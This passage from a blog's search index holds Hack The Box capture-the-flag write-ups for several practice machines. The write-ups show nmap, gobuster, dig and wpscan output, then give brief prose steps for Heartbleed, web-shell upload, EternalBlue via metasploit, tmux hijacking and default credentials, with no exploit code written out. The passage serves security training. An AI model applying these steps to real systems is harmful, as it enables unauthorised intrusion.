Sunday"},{"categories":null,"contents":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.2.22 (Ubuntu) |_ssl-date: 2023-06-07T18:16:21+00:00; -29s from scanner time. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds gobuster └─$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/07 20:00:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 38] /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /encode.php (Status: 200) [Size: 554] /decode.php (Status: 200) [Size: 552] /decode (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] /server-status (Status: 403) [Size: 292] Check dev endpoint Check the content of the files We have a note And a key, which could belong to hype user (since the filename indicates it) Foothold/User Both web server host same image and look identical The picture suggests heartbleed So googling resulted: https://heartbleed.com/ https://xkcd.com/1354/ etc. Let\u0026rsquo;s search for exploit Test the exploit We see that it\u0026rsquo;s vulnerable Let\u0026rsquo;s remove zeros from output Now we need to dump the memory Found a script You can modify the length within the exploit, in case you want to play with it Let\u0026rsquo;s launch the script We might have to launch it few times And we get some results You can use the decoder from the decode endpoint on the webserver or base64 tool Let\u0026rsquo;s also check the key file from the dev endpoint Download it and use xxd tool to reverse the hexdump Okay, it looks like it\u0026rsquo;s a rsa key, we can use to connect via ssh Root Let\u0026rsquo;s enumerate for privesc Upload linpeas Scan the results We see that we can try dirty cow exploit, since it\u0026rsquo;s an old box The list of processes indicate opened session in tmux We can try tmux session hijacking So let\u0026rsquo;s escalate privileges And get a root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/valentine/images/valentine.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/valentine/","summary":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.","tags":["HTB","heartbleed","tmux","dirtycow"],"title":"[HTB] Machine: Valentine"},{"categories":null,"contents":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.01 seconds dig ┌──(kali㉿kali)-[~] └─$ dig AXFR bank.htb @10.10.10.29 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; AXFR bank.htb @10.10.10.29 ;; global options: +cmd bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 bank.htb. 604800 IN NS ns.bank.htb. bank.htb. 604800 IN A 10.10.10.29 ns.bank.htb. 604800 IN A 10.10.10.29 www.bank.htb. 604800 IN CNAME bank.htb. bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 ;; Query time: 231 msec ;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP) ;; WHEN: Tue Jun 06 16:43:22 BST 2023 ;; XFR size: 6 records (messages 1, bytes 171) After adding records to /etc/hosts └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:46:01 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 200) [Size: 1974] /index.php (Status: 302) [Size: 7322] [--\u0026gt; login.php] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.htaccess (Status: 403) [Size: 284] /. (Status: 302) [Size: 7322] [--\u0026gt; login.php] /.html (Status: 403) [Size: 280] /support.php (Status: 302) [Size: 3291] [--\u0026gt; login.php] /.php (Status: 403) [Size: 279] /.htpasswd (Status: 403) [Size: 284] /.htm (Status: 403) [Size: 279] /.htpasswds (Status: 403) [Size: 285] /.htgroup (Status: 403) [Size: 283] /wp-forum.phps (Status: 403) [Size: 288] /.htaccess.bak (Status: 403) [Size: 288] /.htuser (Status: 403) [Size: 282] /.ht (Status: 403) [Size: 278] /.htc (Status: 403) [Size: 279] /dispatch.fcgi (Status: 403) [Size: 288] /mytias.fcgi (Status: 403) [Size: 286] /test.fcgi (Status: 403) [Size: 284] Progress: 16243 / 16245 (99.99%) └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:49:19 Starting gobuster in directory enumeration mode =============================================================== /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /server-status (Status: 403) [Size: 288] gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 17:16:22 Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /server-status (Status: 403) [Size: 288] /balance-transfer (Status: 301) [Size: 314] [--\u0026gt; http://bank.htb/balance-transfer/] Progress: 220431 / 220561 (99.94%) Web server Let\u0026rsquo;s check inc edpoint from gobuster results Let\u0026rsquo;s launch Burp Suite We see strange response when accessing / path We recieve a big redirect response Foothold/User Let\u0026rsquo;s check balance-transfer endpoint We see bunch of transaction files Let\u0026rsquo;s curl and parse the results We see that majority of files have almost identical sizes except one Let\u0026rsquo;s check it We have credentials Use them to login to web server While checking the server, we notice that there is a support page with upload ticket option Let\u0026rsquo;s try file upload attack Check the request in Burp Suite I was trying manipulating Content-Type, adding magic byte, changing file extensions Then I noticed the comment Change extension to htb We were able to upload the file and now we have web-shell Let\u0026rsquo;s launch reverse-shell Root Basic privilege escalation routine Check sudo rights Check suid files etc. or use linpeas like tools We notice strange file named emergency Launch it Boom, we rooted the box Different approach There is a different approach to gain a foothold We saw that we receive a full page, but with response headers 301 or 302 status codes We can set Burp Suite proxy settings to Match and Replace those codes to 200 OK And we will simply open the page without any redirection ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bank/images/bank.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bank/","summary":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB","vhosts","dns","dig","zone-transfer","regex","filter","suid","php","passwd"],"title":"[HTB] Machine: Bank"},{"categories":null,"contents":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://blocky.htb 8192/tcp closed sophos Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds Start gobuster └─$ gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://blocky.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 18:34:46 Starting gobuster in directory enumeration mode =============================================================== /wiki (Status: 301) [Size: 307] [--\u0026gt; http://blocky.htb/wiki/] /wp-content (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/wp-content/] /plugins (Status: 301) [Size: 310] [--\u0026gt; http://blocky.htb/plugins/] /wp-includes (Status: 301) [Size: 314] [--\u0026gt; http://blocky.htb/wp-includes/] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/javascript/] /wp-admin (Status: 301) [Size: 311] [--\u0026gt; http://blocky.htb/wp-admin/] /phpmyadmin (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/phpmyadmin/] /server-status (Status: 403) [Size: 298] Progress: 220560 / 220561 (100.00%) We see wp-admin, so launch wpscan and enumerate Wordpress └─$ wpscan -e --url http://blocky.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://blocky.htb/ [10.10.10.37] [+] Started: Tue Jun 6 18:43:45 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blocky.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://blocky.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; | - http://blocky.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://blocky.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:22 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:22 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:44 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:44 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:04 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:04 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue Jun 6 18:46:16 2023 [+] Requests Done: 3436 [+] Cached Requests: 10 [+] Data Sent: 922.433 KB [+] Data Received: 1.008 MB [+] Memory used: 285.152 MB [+] Elapsed time: 00:02:30 Check phpmyadmin endpoint Foothold/User Check plugins endpoint We see 2 files Download them They have jar extension Upload them jd-gui We retrieve password Try with a notch user that we enumerated with wpscan Success Root Check sudo rights Full sudo access ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blocky/images/blocky.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blocky/","summary":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","wordpress","java","jar","decompile","jd-gui","phpmyadmin","wpscan","ssh","sudo"],"title":"[HTB] Machine: Blocky"},{"categories":null,"contents":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-06T20:33:23+01:00 |_clock-skew: mean: -20m25s, deviation: 34m35s, median: -27s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.84 seconds nmap scripts └─$ nmap -Pn -p135,139,445 --script *vuln* 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:37 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.22s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds Right away we see that the box is vulnerable to ms17-010 Foothold/User/Root Launch metasploit Search for ms17_010 Set options And launch the attack Wait for exploit to finish Grab your flags ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/blue/images/blue.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/blue/","summary":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.","tags":["HTB","smbmap","smbclient","metasploit","ms17-010","eternalblue","meterpreter"],"title":"[HTB] Machine: Blue"},{"categories":null,"contents":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.94 seconds nmap └─$ nmap -Pn -p22,53,80,1331,32400,32469 -sC -sV 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:46 BST Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aaef5ce08e86978247ff4ae5401890c5 (DSA) | 2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA) | 256 b6a07838d0c810948b44b2eaa017422b (ECDSA) |_ 256 4d6840f720c4e552807a4438b8a2a752 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 1331/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd |_http-favicon: Plex |_http-title: Unauthorized |_http-cors: HEAD GET POST PUT DELETE OPTIONS | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds Check web server Nothing to see Launch gobuster Check admin and versions endpoints Check port 32400 Foothold/User We saw in admin endpoint, that it\u0026rsquo;s a Pi-hole It\u0026rsquo;s a DNS sinkhole that is designed to run on Raspberry Pi So let\u0026rsquo;s try default credentials to get an access We\u0026rsquo;re in Root Check sudo rights sudo user Retrieve the flag Oops, we have a note instead It says to check a usb stick Let\u0026rsquo;s check mounted devices We see /dev/sdb mounted at /media/usbstick, where have another note which indicates that the flag was accidentally deleted You can also use mount to see mounted devices I googled to find a way to retrieve a flag Since in linux everything is a file, maybe we can read the contents of the /dev/sdb The files in any OS usually don\u0026rsquo;t get deleted from device, since it\u0026rsquo;s costly to zero every block on the disk When the file gets deleted, the metadata of the blocks (headers etc) that held the data will be changed from used to free The data will be present, until it is overwritten So let\u0026rsquo;s grep the flag ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/mirai/images/mirai.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mirai/","summary":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.","tags":["HTB","raspberrypi","plex","pihole","testdisk","photorec"],"title":"[HTB] Machine: Mirai"},{"categories":null,"contents":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.2.3 |_http-title: Did not follow redirect to https://10.10.10.7/ 